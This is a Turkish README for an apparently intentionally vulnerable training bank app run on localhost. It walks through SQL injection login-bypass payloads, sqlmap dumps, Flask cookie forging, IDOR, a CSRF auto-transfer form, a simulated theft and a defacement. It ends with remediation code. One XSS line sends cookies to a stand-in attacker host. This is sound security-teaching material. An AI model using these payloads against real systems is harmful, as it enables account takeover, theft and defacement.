# KANSER BANK - Siber Guvenlik Egitim Platformu

**Sorumluluk Reddi:** Bu platform sadece egitim amaciyla hazirlanmistir.
Gercek sitelere karsi bu teknikleri kullanmak yasa disidir ve agir cezai
yaptirimlari vardir. Sadece kendi sistemlerinizde veya izinli test
ortamlarinda kullaniniz.

---

## Icerik

| # | Bolum | Konu | Script |
|---|-------|------|--------|
| 0 | [Kurulum](#0-kurulum) | Ortam hazirligi | - |
| 1 | [Kesif](#1-kesif-asamasi-reconnaissance) | nmap, dirsearch, gobuster | - |
| 2 | [SQLi Login Bypass](#2-sql-injection-login-bypass) | `' OR '1'='1` | `scripts/01-sql-login-bypass.py` |
| 3 | [SQLi Veri Dump](#3-sql-injection-ile-veri-dump) | Veritabanini bosaltma | `scripts/02-sql-data-dump.py` |
| 4 | [Session Hijacking](#4-session-hijacking) | Cookie calma/taklit | `scripts/03-session-hijacking.py` |
| 5 | [IDOR](#5-idor-insecure-direct-object-reference) | Baska hesaba erisim | `scripts/04-ido-access.py` |
| 6 | [CSRF](#6-csrf-cross-site-request-forgery) | Zorunlu havale | `scripts/05-csrf-transfer.py` |
| 7 | [Para Transferi](#7-para-transferi-sqli--idor) | SQLi + IDOR ile para transferi | `scripts/06-para-transfer.py` |
| 8 | [Admin Panel](#8-admin-paneline-sizma) | Admin yetkisi alma | `scripts/02-sql-data-dump.py` |
| 9 | [Site Deface](#9-site-deface---hacked-by-tarikdxd) | Siteyi hackleme | `scripts/07-deface.py` |
| 10 | [Cozumler](#10-cozumler-ve-korunma) | Nasil korunulur | - |

---

## 0) KURULUM

### Gereksinimler
- Python 3.8+
- pip (Python paket yoneticisi)

### Adim 1: Bagimliliklari yukle

```bash
cd siberguvenlikogretici/bank-app
pip install -r requirements.txt
```

### Adim 2: Veritabanini olustur

```bash
python database.py
```

Bu komut:
- `bank.db` dosyasini olusturur
- 7 kullanici hesabi ekler (admin, ahmet, mehmet, tarikdxd, zeynep, ali, ayse)
- Her kullaniciya bir banka hesabi acar
- Site ayarlarini ekler

### Adim 3: Banka uygulamasini baslat

```bash
python app.py
```

`http://localhost:5000` adresinde banka uygulamasi calisacak.

### Test Kullanicilari

| Kullanici | Sifre | Rol | Bakiye | Hesap No |
|-----------|-------|-----|--------|----------|
| admin | admin123 | **admin** | 99,999 TL | TR0000000001 |
| ahmet | 123456 | user | 5,000 TL | TR1234567890 |
| mehmet | 123456 | user | 2,500 TL | TR0987654321 |
| **tarikdxd** | tarik123 | **SALDIRGAN** | 0 TL | TR5555555555 |
| zeynep | 123456 | user | 10,000 TL | TR1111111111 |
| ali | 123456 | user | 3,200 TL | TR2222222222 |
| ayse | 123456 | user | 7,800 TL | TR3333333333 |

---

## 1) KESIF ASAMASI (Reconnaissance)

Saldirinin ilk adimi hedefi tanimaktir. Kanser Bank uygulamasina
goz atalim.

### 1.1 Manuel Kesif

1. Tarayicida `http://localhost:5000` adresine git
2. Sayfayi incele (sag tik -> Incele / F12)
3. Form alanlarina, URL yapisina, cookie'lere bak
4. Normal bir kullanici ile giris yap: `ahmet / 123456`

### 1.2 Nmap ile Port Tarama

```bash
nmap -sV -p 1-10000 localhost
```

Nmap, hedefteki acik portlari ve servisleri gosterir:
```
PORT     STATE SERVICE
5000/tcp open  http    Flask (Werkzeug)
```

### 1.3 Dizin / Dosya Tarama (dirsearch)

```bash
# dirsearch kurulu degilse:
pip install dirsearch

# Tarama:
dirsearch -u http://localhost:5000
```

Beklenen cikti:
```
/admin                  Admin Paneli (yetki kontrolu YOK!)
/dashboard              Kullanici paneli
/transfer               Havale sayfasi
/account/1              IDOR zafiyeti
/static/                Statik dosyalar
```

### 1.4 Robots.txt

```bash
curl http://localhost:5000/robots.txt
```

(robots.txt eklenmemis, bu da bir bilgi)

### Kesiften Cikarilanlar:

1. **Flask** uygulamasi (Werkzeug server)
2. `/admin` sayfasi bulundu
3. URL yapisi tahmin edilebilir (`/account/1`, `/account/2`)
4. Form method'u POST (CSRF kontrolu yok)
5. Debug mod acik (hata sayfalari detayli)

---

## 2) SQL INJECTION LOGIN BYPASS

### Teori

SQL Injection, kullanici girdisinin SQL sorgusuna guvensiz
birlestirilmesidir. Ornegin:

```python
# ZAFIYETLI KOD:
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Normal giris:
```
username = ahmet
password = 123456
Sorgu: SELECT * FROM users WHERE username = 'ahmet' AND password = '123456'
```

SQL Injection ile:
```
username = ' OR '1'='1
password = x
Sorgu: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'x'
```

`'1'='1'` her zaman `TRUE` oldugu icin sorgu tum kullanicilari dondurur
ve sistem ilk kullaniciyi alir (genelde admin).

### Uygulama

```bash
python ../scripts/01-sql-login-bypass.py
```

### Manuel Test (Tarayicida)

1. `http://localhost:5000` adresine git
2. Kullanici adi: `' OR '1'='1`
3. Sifre: `x` (herhangi bir sey)
4. Giris yap!

Eger admin paneline yonlendirildiysen, admin olarak giris yaptin demektir.

### Farkli Payload'lar

```
Payload                             Aciklama
------                              --------
' OR '1'='1                         Tum kullanicilari getir
admin' --                           Yorum satiri ile admin
admin' #                            MySQL yorum satiri
' OR 1=1 --                         Sayisal OR
' OR '1'='1' LIMIT 1 --             Ilk kullanici
' UNION SELECT * FROM users --      UNION ile veri ekleme
' AND 1=0 UNION SELECT 'x','x','admin','x','admin' --  Hayali admin
```

---

## 3) SQL INJECTION ILE VERI DUMP

SQL Injection sadece giris atlatmakla kalmaz, tum veritabanini
cekmenizi saglar. Kanser Bank'ta iki zafiyet birlikte calisir:
1. SQLi ile admin giris
2. Admin panelinde yetki kontrolu yok

### Uygulama

```bash
python ../scripts/02-sql-data-dump.py
```

### Beklenen Cikti

```
[ADIM 2] SQL Injection - Veritabani Dump

[OK] Admin paneline erisildi!

[VERI] Kullanicilar:
------------------------------------------------------------
 ID Kullanici       Sifre           Ad Soyamasi          Rol
------------------------------------------------------------
  1 admin           admin123        Admin Kullanici      admin
  2 ahmet           123456          Ahmet Yilmaz         user
  3 mehmet          123456          Mehmet Demir         user
  4 tarikdxd        tarik123        Tarik Saldirgan      user
  5 zeynep          123456          Zeynep Kaya          user
  6 ali             123456          Ali Yildiz           user
  7 ayse            123456          Ayse Celik           user

[VERI] Hesaplar:
------------------------------------------------------------
 ID User ID Hesap No                     Bakiye        Tur
------------------------------------------------------------
  1        1 TR0000000001              99999.0 TL      admin
  2        2 TR1234567890               5000.0 TL      vadesiz
  3        3 TR0987654321               2500.0 TL      vadesiz
  4        4 TR5555555555                  0.0 TL      vadesiz
  5        5 TR1111111111              10000.0 TL      vadesiz
  6        6 TR2222222222               3200.0 TL      vadesiz
  7        7 TR3333333333               7800.0 TL      vadesiz
```

### SQLMap ile Otomatik Dump

SQLMap, SQL injection testi icin en populer araclardan biridir:

```bash
# Login formunda SQLi testi
sqlmap -u "http://localhost:5000/" --data="username=test&password=test" --batch --dump

# Cookie ile devam eden oturumda
sqlmap -u "http://localhost:5000/transfer" --data="from_account=test&to_account=test&amount=1" --cookie="session=<cookie>" --batch --dump
```

SQLMap otomatik olarak:
1. Zafiyeti tespit eder
2. Veritabani turunu bulur (SQLite)
3. Tablolari listeler
4. Tum veriyi ceker

---

## 4) SESSION HIJACKING

### Teori

Session hijacking, bir kullanicinin oturum cookie'sini calarak
onun kimligine burunmektir. Kanser Bank'ta:

1. Cookie format: Flask imzali cookie
2. Secret key zayif: `kanser-bank-secret-2024`
3. HttpOnly flag olmayabilir
4. XSS ile cookie calinabilir

### XSS ile Cookie Calma

Sayfada XSS zafiyeti varsa (ornegin admin panelinde site mesaji):

```html
<script>document.location='http://saldirgan.com/?c='+document.cookie</script>
```

Bu script calistiginda, kullanicinin cookie'si saldirganin
sunucusuna gonderilir.

### Manual Cookie Manipulasyonu

```bash
python ../scripts/03-session-hijacking.py
```

### Flask-unsign ile Cookie Cozme

```bash
# Flask cookie'sini decode etme
pip install flask-unsign

# Cookie'yi decode et
flask-unsign --decode --cookie "eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6ImFobWV0Iiwicm9sZSI6InVzZXIifQ.Z2QxNA.abcdef123456"

# Secret key'i brute-force ile bul
flask-unsign --unsign --cookie "<cookie>" --wordlist rockyou.txt
# Bulunan: kanser-bank-secret-2024

# Yeni bir cookie olustur (admin olarak)
flask-unsign --sign --secret "kanser-bank-secret-2024" --cookie "{'user_id':1,'username':'admin','role':'admin'}"
```

---

## 5) IDOR (Insecure Direct Object Reference)

### Teori

IDOR, bir kaynaga dogrudan ID ile erisildiginde yetki kontrolu
yapilmamasidir. Kanser Bank'ta:

```
Normal:   /account/4  -> tarikdxd'nin hesabi (kendi hesabim)
IDOR:     /account/1  -> Admin hesabi (baskasinin!)
          /account/2  -> Ahmet'in hesabi
          /account/5  -> Zeynep'in hesabi
```

### Uygulama

```bash
python ../scripts/04-ido-access.py
```

### Manuel Test

1. tarikdxd olarak giris yap (`tarikdxd / tarik123`)
2. Tarayicida `http://localhost:5000/account/1` adresine git
3. Admin'in hesap bilgilerini gor!

### IDOR'un Etkileri

| ID | Kullanici | Bakiye | Goruntulendi mi? |
|----|-----------|--------|------------------|
| 1 | Admin | 99,999 TL | EVET |
| 2 | Ahmet | 5,000 TL | EVET |
| 3 | Mehmet | 2,500 TL | EVET |
| 4 | tarikdxd | 0 TL | EVET (kendi) |
| 5 | Zeynep | 10,000 TL | EVET |
| 6 | Ali | 3,200 TL | EVET |
| 7 | Ayse | 7,800 TL | EVET |

**Tum kullanicilarin hesap bilgileri ele gecti!**

---

## 6) CSRF (Cross-Site Request Forgery)

### Teori

CSRF, kullanicinin haberi olmadan onun oturumu uzerinden
istek yapilmasidir. Kanser Bank'ta transfer formunda CSRF
token'i olmadigi icin bu saldiri mumkundur.

### Saldiri Vektoru

Saldirgan, Ahmet'e su HTML'i iceren bir e-posta gonderir:

```html
<form action="http://localhost:5000/transfer" method="POST" id="csrf-form">
    <input name="from_account" value="TR1234567890">
    <input name="to_account" value="TR5555555555">
    <input name="amount" value="5000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

Ahmet, bankada oturum acmisken bu sayfayi acarsa:

1. Sayfa otomatik olarak formu gonderir
2. Ahmet'in cookie'si otomatik eklenir (tarayici yapar)
3. Ahmet'in hesabindan tarikdxd'ye 5000 TL gider
4. Ahmet farkina varmaz!

### Uygulama

```bash
python ../scripts/05-csrf-transfer.py
```

---

## 7) PARA TRANSFERI (SQLi + IDOR)

Bu bolumde ogrendigimiz tum teknikleri birlestiriyoruz:
**Ahmet'in hesabindan tarikdxd'nin hesabina para transferi.**

### Adim 1: IDOR ile Ahmet'in Hesap Numarasini Bul

```bash
# Tarayicida:
http://localhost:5000/account/2
# Ahmet'in hesap no: TR1234567890
```

### Adim 2: SQLi ile Transfer

```bash
python ../scripts/06-para-transfer.py
```

### Adim 3: Adim Adim Manual Saldiri

```bash
# 1. tarikdxd olarak giris yap
curl -c cookies.txt -X POST http://localhost:5000/ \
  -d "username=tarikdxd&password=tarik123"

# 2. IDOR ile Ahmet'in hesabini gor
curl -b cookies.txt http://localhost:5000/account/2

# 3. CSRF benzeri transfer (IDOR ile)
curl -b cookies.txt -X POST http://localhost:5000/transfer \
  -d "from_account=TR1234567890&to_account=TR5555555555&amount=5000"

# 4. Sonucu kontrol et
curl -b cookies.txt http://localhost:5000/account/4
```

### Son Durum

| Kullanici | Once | Sonra |
|-----------|------|-------|
| Ahmet | 5,000 TL | 0 TL (tum para cekildi) |
| tarikdxd | 0 TL | 5,000 TL (calindi!) |

---

## 8) ADMIN PANELINE SIZMA

Admin paneline erismek icin iki yol var:

### Yol 1: SQLi ile Admin Olarak Giris

```bash
# Tarayicida:
Kullanici: ' OR role='admin' --
Sifre:     x
```

### Yol 2: IDOR ile Admin Bilgilerini Gorup Sifresini Kullan

```bash
# Admin'in sifresini IDOR ile gor
curl -b cookies.txt http://localhost:5000/account/1
# Sifre: admin123

# Admin olarak normal giris yap
curl -c admin.txt -X POST http://localhost:5000/ \
  -d "username=admin&password=admin123"
```

### Admin Panelindeki Yetkiler

Admin paneline girdikten sonra:
1. Tum kullanicilari ve sifreleri gorme
2. Tum hesaplari ve bakiyeleri gorme
3. Tum islem gecmisini gorme
4. **Site mesajini degistirme** (deface icin kritik!)

---

## 9) SITE DEFACE - "HACKED BY TARIKDXD"

### Hedef

Ana sayfadaki site mesajinin "HACKED BY TARIKDXD" olarak
degistirilmesi. Boylece siteyi ziyaret eden herkes hacklendigini gorur.

### Adim 1: Admin Paneline Giris

SQL injection ile admin olarak giris yap:

```
Kullanici: ' OR role='admin
Sifre:     x
```

### Adim 2: Site Mesajini Degistir

Admin panelinde (`/admin`) site mesaji alanina yaz:

```
HACKED BY TARIKDXD
```

### Uygulama

```bash
python ../scripts/07-deface.py
```

### Sonuc

Ana sayfaya giden herkes gorur:

```
+------------------------------------------+
|  HACKED BY TARIKDXD                       |
|  KANSER BANK GUVENLIK ZAFIYETLI ALTYAPI  |
|  TUM VERILER ELE GECIRILDI               |
+------------------------------------------+
```

### Deface Sayfasi

`http://localhost:5000/deface` adresinde ozel bir deface sayfasi
hazir. Bu sayfa:

- Siyah arkaplan
- Kirmizi "HACKED BY TARIKDXD" yazisi
- ASCII art
- Titreyen efekt
- Yesil alt yazi

### Gercek Deface Yontemleri

Gercek hayatta deface genelde su yontemlerle yapilir:

1. **File Upload**: Sunucuya zararli dosya yukleme
2. **LFI/RFI**: Local/Remote File Inclusion
3. **SQLi**: Veritabanindan template'e yazi yazma
4. **RCE**: Remote Code Execution ile dosya degistirme
5. **SSRF**: Server-Side Request Forgery
6. **Admin paneli**: Yetkisiz erisimle ayarlari degistirme

---

## 10) COZUMLER VE KORUNMA

Her zafiyet icin cozum onerileri:

### 1. SQL Injection Cozumu

```python
# ZAFIYETLI
query = f"SELECT * FROM users WHERE username = '{username}'"

# COZUMLU (Parameterized Query)
query = "SELECT * FROM users WHERE username = ?"
user = conn.execute(query, (username,)).fetchone()
```

### 2. IDOR Cozumu

```python
# ZAFIYETLI
account = conn.execute("SELECT * FROM accounts WHERE id=?", (account_id,))

# COZUMLU
account = conn.execute(
    "SELECT * FROM accounts WHERE id=? AND user_id=?",
    (account_id, session['user_id'])
)
```

### 3. CSRF Cozumu

```python
# Flask-WTF ile CSRF korumasi ekle
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# Her forma token ekle
<form>
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
</form>
```

### 4. Session Hijacking Cozumu

```python
# Guclu secret key
import secrets
app.secret_key = secrets.token_hex(32)

# Cookie guvenligi
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,    # HTTPS'de
    SESSION_COOKIE_SAMESITE='Lax'  # CSRF'ye karsi
)
```

### 5. Yetki Kontrolu

```python
# Decorator ile yetki kontrolu
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'role' not in session or session['role'] != 'admin':
            return 'Yetkisiz erisim!', 403
        return f(*args, **kwargs)
    return decorated

@app.route('/admin')
@admin_required
def admin_panel():
    # ...
```

### 6. Genel Guvenlik Onlemleri

| Onlem | Aciklama |
|-------|----------|
| Input Validation | Tum girdileri dogrula (tip, uzunluk, format) |
| Output Encoding | XSS'i engellemek icin ciktilari encode et |
| HTTPS | Tum trafigi sifrele |
| Rate Limiting | Brute-force saldirilarini engelle |
| WAF | Web Application Firewall |
| Logging | Tum islemleri kaydet |
| Principle of Least Privilege | En az yetki prensibi |
| Regular Updates | Bagimliliklari guncel tut |

---

## FULL SALDIRI AKISI (Ozet)

```
1. KESIF
   nmap localhost
   dirsearch -u http://localhost:5000
   -> /admin, /transfer, /account/{id}

2. SQL INJECTION
   Kullanici: ' OR '1'='1
   -> Admin olarak giris

3. VERI DUMP
   /admin sayfasindan tum kullanicilar, sifreler, hesaplar
   -> Ahmet TR1234567890, 5000 TL
   -> tarikdxd TR5555555555, 0 TL

4. IDOR
   /account/1 -> Admin hesabi
   /account/2 -> Ahmet'in hesabi
   -> Tum bilgiler ele gecti

5. CSRF + IDOR + SQLi ile PARA TRANSFERI
   from_account = TR1234567890 (Ahmet'in hesabi)
   to_account = TR5555555555   (tarikdxd'nin hesabi)
   amount = 5000
   -> Ahmet'in 5000 TL'si tarikdxd'ye gitti!

6. DEFACE
   Admin panelinde site mesajini degistir
   -> "HACKED BY TARIKDXD"

7. SITE TAMAMEN HACKLENDI!
```

---

## Scriptleri Calistirma Sirasi

```bash
# Ortami hazirla
cd bank-app
pip install -r requirements.txt
python database.py
python app.py &
cd ..

# Saldiri adimlari
python scripts/01-sql-login-bypass.py
python scripts/02-sql-data-dump.py
python scripts/03-session-hijacking.py
python scripts/04-ido-access.py
python scripts/05-csrf-transfer.py
python scripts/06-para-transfer.py
python scripts/07-deface.py
```

---

## Ek Kaynaklar

- **Portswigger Web Security Academy** (ucretsiz, interaktif)
- **HackTheBox** (pratik platformu)
- **TryHackMe** (baslangic dostu)
- **OWASP Top 10** (en kritik zafiyetler)
- **PentesterLab** (egitim sertifikasi)

## Lisans

Bu proje sadece egitim amaciyla hazirlanmistir.
Kotu amacla kullanim tamamen kullanicinin sorumlulugundadir.
